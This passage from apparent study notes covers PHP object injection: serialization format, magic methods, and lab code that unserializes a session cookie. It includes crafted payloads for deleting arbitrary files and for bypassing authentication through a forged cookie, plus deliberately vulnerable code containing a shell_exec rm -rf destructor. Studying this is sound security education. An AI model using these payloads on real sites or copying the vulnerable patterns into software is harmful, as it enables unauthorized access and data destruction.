      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">:,,</span><span class="nx">Abcdef</span><span class="dl">"</span><span class="s2">:1:{s:9:,,Something</span><span class="dl">"</span><span class="p">;</span><span class="nl">s</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="dl">"</span><span class="s2">Active</span><span class="dl">"</span><span class="p">;}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>PHP <strong>Serialized objects</strong> contain information about the <strong>type of object</strong> → <em>Necessary for reconstruction.</em></p>

<p><strong>Booleans</strong> <code class="language-plaintext highlighter-rouge">b:&lt;i&gt;;</code></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">i</code> is  <strong>0 or 1</strong>  (True / False)</li>
</ul>

<p><strong>Strings</strong> <code class="language-plaintext highlighter-rouge">s:&lt;i&gt;:"&lt;s&gt;";</code></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">i</code> is the <strong>string length</strong></li>
  <li><code class="language-plaintext highlighter-rouge">s</code> is the <strong>string itself</strong></li>
</ul>

<p><strong>Arrays</strong> <code class="language-plaintext highlighter-rouge">a:&lt;i&gt;:{&lt;elements&gt;}</code></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">i</code> is the <strong>number of elements</strong> in the array (integer)</li>
  <li><code class="language-plaintext highlighter-rouge">elements</code> are zero or more serialized <strong>key value</strong> pairs of the form <code class="language-plaintext highlighter-rouge">&lt;key&gt;&lt;value&gt;</code></li>
</ul>

<p><strong>Objects</strong> (classes) <code class="language-plaintext highlighter-rouge">O:&lt;i&gt;:"&lt;s&gt;":&lt;i&gt;:{&lt;properties&gt;}</code></p>

<ul>
  <li>First <code class="language-plaintext highlighter-rouge">&lt;i&gt;</code> is the <strong>string length</strong> of <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> (integer)</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> is the fully qualified <strong>class name</strong></li>
  <li>Second <code class="language-plaintext highlighter-rouge">&lt;i&gt;</code> number of <strong>object properties</strong> (integer)</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;properties&gt;</code> zero or more serialized <strong>name-value</strong> pairs <code class="language-plaintext highlighter-rouge">&lt;name&gt;&lt;value&gt;</code>
    <ul>
      <li><code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> is a serialized string representing the <strong>property name</strong> <code class="language-plaintext highlighter-rouge">s:&lt;i&gt;:"&lt;s&gt;"</code>
        <ul>
          <li><code class="language-plaintext highlighter-rouge">&lt;i&gt;</code> is the <strong>string length</strong> of <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code></li>
        </ul>
      </li>
      <li><code class="language-plaintext highlighter-rouge">&lt;value&gt;</code> is any value that is serializable</li>
    </ul>
  </li>
</ul>

<p>The <strong>visibility</strong> of properties influences the value of <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code></p>

<ul>
  <li><strong>Public Properties</strong> → <em>simple name of the property</em></li>
  <li><strong>Protected Properties → “ +</strong> <em>prepended with</em> <code class="language-plaintext highlighter-rouge">\0*\0</code> <em>- asterix enclosed in two NULL bytes (0x00)</em></li>
  <li><strong>Private Properties</strong> →  “ + prepended with <code class="language-plaintext highlighter-rouge">\0&lt;s&gt;\0</code> - enclosed in two NULL bytes, where <code class="language-plaintext highlighter-rouge">&lt;s&gt;</code> is the fully qualified class name</li>
</ul>

<p>In <strong>WebAPP</strong> might often encounter the PHP <strong>serialized data to be base64 encoded</strong> for transportation purposes.</p>

<h3 id="exploitation-strategies"><span class="me-2"><em>Exploitation Strategies</em></span><a href="#exploitation-strategies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><code class="language-plaintext highlighter-rouge">PHP object injection</code> isn’t straightforward as its Java counterpart and depends heavily on the details of each vulnerability</p>

<p>There’s no <strong>ysoserial</strong> for php that gives easy RCE.</p>

<p>Relies heavily on <strong>HOW</strong> the unserialized data is further handled.</p>

<p>Unserialized data isn’t necessarily used unless some <strong>magic methods</strong> are in place.</p>

<p><a href="https://www.php.net/manual/en/language.oop5.magic.php"><strong>Magic methods</strong></a> are functions available to be used in PHP Object-Oriented Programming. They’re functions that are being <strong>launched dynamically</strong> once a certain trigger is present.</p>

<p>They can be recognized in code by two underscores in the beginning of their names. Triggers:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">__construct()</code> → <em>Loaded upon creating a new instance of a class</em></li>
  <li><code class="language-plaintext highlighter-rouge">__destruct()</code> → <em>Loaded when no more references of a current class are present in memory</em></li>
  <li><code class="language-plaintext highlighter-rouge">__wakeUp()</code> → <em>Loaded upon <strong>deserializing an object</strong></em></li>
</ul>

<p><strong>Example Code</strong></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">define</span> <span class="p">(</span><span class="s1">'LOG'</span><span class="p">,</span> <span class="s1">'/tmp/'</span><span class="p">);</span>
<span class="kd">class</span> <span class="nc">DoLog</span>
<span class="p">{</span>
	<span class="k">private</span> <span class="nv">$filepath</span><span class="p">;</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span> <span class="o">=</span> <span class="no">LOG</span> <span class="mf">.</span> <span class="s2">"history.log"</span><span class="p">;</span>
		<span class="nb">touch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span><span class="p">);</span>
	
	<span class="p">}</span>
	
	<span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Logfile "</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"is beign removed</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
		<span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="nv">$log</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DoLog</span><span class="p">();</span>
<span class="nb">var_Export</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$log</span><span class="p">));</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Upon creating a new instance of the class, it creates a log file (default constructor)</li>
  <li>File is then removed (default destructor)</li>
</ul>

<p>The file will also output serialized data about the created class object.</p>

<p><code class="language-plaintext highlighter-rouge">php v.php</code></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%201.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%201.png" alt="Untitled" loading="lazy"></a></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s1">'O:5:"DoLog":1:{s:15:"'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="mf">.</span> <span class="s1">'DoLog'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="mf">.</span> <span class="s1">'filepath";s:16:"/tmp/history.log";}'</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Modifying the code by adding unserialization logic</strong></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">define</span> <span class="p">(</span><span class="s1">'LOG'</span><span class="p">,</span> <span class="s1">'/tmp/'</span><span class="p">);</span>
<span class="kd">class</span> <span class="nc">DoLog</span>
<span class="p">{</span>
	<span class="k">private</span> <span class="nv">$filepath</span><span class="p">;</span>
	<span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span> <span class="o">=</span> <span class="no">LOG</span> <span class="mf">.</span> <span class="s2">"history.log"</span><span class="p">;</span>
		<span class="nb">touch</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span><span class="p">);</span>
	
	<span class="p">}</span>
	
	<span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
	<span class="p">{</span>
		<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">[+] Logfile "</span> <span class="mf">.</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"is beign removed</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
		<span class="nb">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">filepath</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>

<span class="nv">$log</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DoLog</span><span class="p">();</span>
<span class="nb">var_Export</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$log</span><span class="p">));</span>

<span class="nv">$serialized</span> <span class="o">=</span> <span class="s1">'O:5:"DoLog":1:{s:15:"'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="mf">.</span> <span class="s1">'DoLog'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="mf">.</span> <span class="s1">'filepath";s:16:"/tmp/history.log";}'</span><span class="p">;</span>
<span class="nv">$o</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$serialized</span><span class="p">);</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Upon deserialization, the class’s magic methods will be run so that the file will be removed in the destructor function</p>

<p><code class="language-plaintext highlighter-rouge">php v.php</code></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%202.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%202.png" alt="Untitled" loading="lazy"></a></p>

<p>The program tried to remove the log file <strong>twice</strong>, once upon the legitimate <strong>class instantiation</strong> and once upon the <strong>deserialization</strong></p>

<p>Try to delete the arbitrary file. First need to create the <code class="language-plaintext highlighter-rouge">history.lol</code> file  → <em>Which has an equal filename length compared to the log file</em></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%203.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%203.png" alt="Untitled" loading="lazy"></a></p>

<p>Now, the <code class="language-plaintext highlighter-rouge">$serialized</code> will be altered and <code class="language-plaintext highlighter-rouge">history.log</code> will be replaced with <code class="language-plaintext highlighter-rouge">history.lol</code></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$serialized</span> <span class="o">=</span> <span class="s1">'O:5:"DoLog":1:{s:15:"'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="mf">.</span> <span class="s1">'DoLog'</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span> <span class="mf">.</span> <span class="s1">'filepath";s:16:"/tmp/history.lol";}'</span><span class="p">;</span>
<span class="nv">$o</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$serialized</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">php v.php</code></p>

<p><a href="/../assets/img/study/attackserialization/Untitled%204.png" class="popup img-link  shimmer"><img src="/../assets/img/study/attackserialization/Untitled%204.png" alt="Untitled" loading="lazy"></a></p>

<p>The destructor function to be run on the <code class="language-plaintext highlighter-rouge">history.lol</code> file which was removed. This way, we were able to <strong>manipulate serialized PHP</strong> data in order to <strong>alter the original</strong> behavior of the file.</p>

<p>In the real world, such data often comes from other sources, for example, <strong>HTTP request parameters</strong>.</p>

<p>Exploitation of such vulnerability was possible because:</p>

<ul>
  <li>Had access to the source code</li>
  <li>Had access to the original serialized payload → <em>knew what to alter in it</em></li>
  <li>Vulnerable function was implemented in the default destructor → <em>data was used after the deserialization - There could be a case when data is unserialized but not used in a insecure manner.</em></li>
</ul>

<h3 id="simple-example"><span class="me-2">“Simple” Example</span><a href="#simple-example" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p><strong>index.php</strong></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require_once</span><span class="p">(</span><span class="s2">"classes/Auth.class.php"</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s2">"classes/FileManager.class.php"</span><span class="p">);</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]</span> <span class="k">and</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">])){</span>
    <span class="nv">$session</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'session'</span><span class="p">]);</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="nf">isAuth</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"está autenticado"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$session</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Auth</span><span class="p">();</span>
        <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"session"</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$session</span><span class="p">),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s2">"não está autenticado"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$session</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Auth</span><span class="p">();</span>
    <span class="nb">setcookie</span><span class="p">(</span><span class="s2">"session"</span><span class="p">,</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$session</span><span class="p">),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">);</span>
    <span class="k">echo</span> <span class="s2">"não está autenticado"</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>Auth.class.php</strong></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">Auth</span><span class="p">{</span>

    <span class="k">public</span> <span class="nv">$user</span> <span class="o">=</span> <span class="s2">"guest"</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$role</span> <span class="o">=</span> <span class="s2">"guest"</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$session_status</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">isAuth</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">session_status</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">isAdmin</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">role</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">doAuth</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$user</span> <span class="o">==</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nv">$password</span> <span class="o">==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p><strong>FileManager.class.php</strong></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span> 

<span class="kd">class</span> <span class="nc">FileManager</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s2">"/home/kali/Desktop/eWPTX/serialization/insegura/tmp/"</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span> <span class="mf">.</span> <span class="s2">"log.txt"</span><span class="p">,</span> <span class="s2">"Sessão iniciada no File Manager!"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">putlog</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span> <span class="mf">.</span> <span class="s2">"log.txt"</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">readLog</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span> <span class="mf">.</span> <span class="s2">"log.txt"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"rm -rf "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">path</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"*"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The application checks user authentication using cookies that store serialized session objects. If the session does not exist or is not authenticated, a new session is created and serialized into the cookie. The <code class="language-plaintext highlighter-rouge">FileManager</code> class manages session logs and cleans up temporary files when destroyed.</p>

<p>So, if you verify the cookies in the browser you can see that the value is</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="s2">"session"</span><span class="o">:</span> <span class="nc">O</span><span class="o">%</span><span class="mi">3</span><span class="no">A4</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="nc">Auth</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="no">A3</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">7</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A4</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">user</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A5</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">guest</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A4</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">role</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A5</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">guest</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A14</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">session_status</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bb</span><span class="o">%</span><span class="mi">3</span><span class="no">A0</span><span class="o">%</span><span class="mi">3</span><span class="nc">B</span><span class="o">%</span><span class="mi">7</span><span class="nc">D</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If you use an urldecode you can see the serialized parameters of the object.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"Auth"</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"user"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"guest"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"role"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"guest"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"session_status"</span><span class="p">;</span><span class="n">b</span><span class="o">:</span><span class="mi">0</span><span class="p">;}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>So to bypass the requisition, you can do this:</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"Auth"</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"user"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"guest"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">4</span><span class="o">:</span><span class="s2">"role"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">"guest"</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">14</span><span class="o">:</span><span class="s2">"session_status"</span><span class="p">;</span><span class="n">b</span><span class="o">:</span><span class="mi">1</span><span class="p">;}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And then url encoded it</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nc">O</span><span class="o">%</span><span class="mi">3</span><span class="no">A4</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="nc">Auth</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="no">A3</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">7</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A4</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">user</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A5</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">guest</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A4</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">role</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A5</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">guest</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bs</span><span class="o">%</span><span class="mi">3</span><span class="no">A14</span><span class="o">%</span><span class="mi">3</span><span class="nc">A</span><span class="o">%</span><span class="mi">22</span><span class="n">session_status</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">3</span><span class="nc">Bb</span><span class="o">%</span><span class="mi">3</span><span class="no">A1</span><span class="o">%</span><span class="mi">3</span><span class="nc">B</span><span class="o">%</span><span class="mi">7</span><span class="nc">D</span>
</pre></td></tr></tbody></table></code></div></div>

<p>So this will trigger the function</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>    <span class="k">if</span><span class="p">(</span><span class="nv">$session</span><span class="o">-&gt;</span><span class="nf">isAuth</span><span class="p">())</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"está autenticado"</span><span class="p">;</span>
    <span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>But, if we instance the file manager.</p>

<p><strong>index.php</strong></p>

